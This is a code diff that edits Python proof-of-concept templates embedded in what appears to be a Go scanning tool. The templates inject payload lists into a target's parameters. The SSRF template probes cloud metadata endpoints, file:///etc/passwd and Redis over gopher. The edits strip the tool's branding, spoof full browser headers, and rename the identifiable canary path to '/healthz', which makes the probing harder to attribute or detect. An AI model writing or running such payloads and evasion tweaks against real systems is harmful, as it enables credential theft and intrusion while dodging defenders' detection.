@@ -30,18 +30,35 @@ import (
 
 const pocCommon = `#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""blade PoC scaffold (__CLASS__) — 改这三处即可用：
+"""PoC scaffold (__CLASS__) — 改这三处即可用：
    BASE  = 目标地址（可命令行覆盖 argv[1]）
    PARAM = 参数名（argv[2]）
    PAYLOADS = 载荷列表
 判据：输出以 MATCH 开头的行 = 命中；最后打印 SUMMARY。
 """
-import sys, ssl, json, re, time, threading, urllib.request, urllib.parse, urllib.error
+import sys, os, ssl, json, re, time, threading, gzip, zlib, urllib.request, urllib.parse, urllib.error
 
 BASE  = sys.argv[1] if len(sys.argv) > 1 else "__BASE__"
 PARAM = sys.argv[2] if len(sys.argv) > 2 else "__PARAM__"
 CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
-UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
+UA = {
+    "User-Agent": os.environ.get("TARGET_USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36"),
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": os.environ.get("TARGET_ACCEPT_LANGUAGE", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"),
+    "Accept-Encoding": "gzip, deflate",
+}
+
+def _decode_body(raw, enc):
+    e = (enc or "").lower().strip()
+    if e == "gzip":
+        try: return gzip.decompress(raw)
+        except Exception: return raw
+    if e == "deflate":
+        try: return zlib.decompress(raw)
+        except Exception:
+            try: return zlib.decompress(raw, -zlib.MAX_WBITS)
+            except Exception: return raw
+    return raw
 
 def inject(base, param, payload):
     if "FUZZ" in base:
@@ -58,9 +75,11 @@ def fetch(url, method="GET", data=None, headers=None, timeout=15):
     t0 = time.time()
     try:
         with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
-            return r.status, dict(r.headers), r.read(2_000_000), int((time.time()-t0)*1000)
+            hdrs = dict(r.headers)
+            return r.status, hdrs, _decode_body(r.read(2_000_000), hdrs.get("Content-Encoding", "")), int((time.time()-t0)*1000)
     except urllib.error.HTTPError as e:
-        return e.code, dict(e.headers or {}), e.read(1_000_000), int((time.time()-t0)*1000)
+        hdrs = dict(e.headers or {})
+        return e.code, hdrs, _decode_body(e.read(1_000_000), hdrs.get("Content-Encoding", "")), int((time.time()-t0)*1000)
     except Exception as e:
         return 0, {}, str(e).encode(), int((time.time()-t0)*1000)
 
@@ -118,7 +137,7 @@ for p in PATHS:
 finish(hits, len(PATHS))
 `,
 	"ssrf": `# 先用你自己的回连/HTTP 日志地址替换 CANARY；元数据地址只做只读 GET
-CANARY = "http://127.0.0.1:9/blade-ssrf-canary"
+CANARY = "http://127.0.0.1:9/healthz"
 TARGETS = [CANARY, "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/", "http://100.100.100.200/latest/meta-data/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_PING"]
 hits = []
 for p in TARGETS:
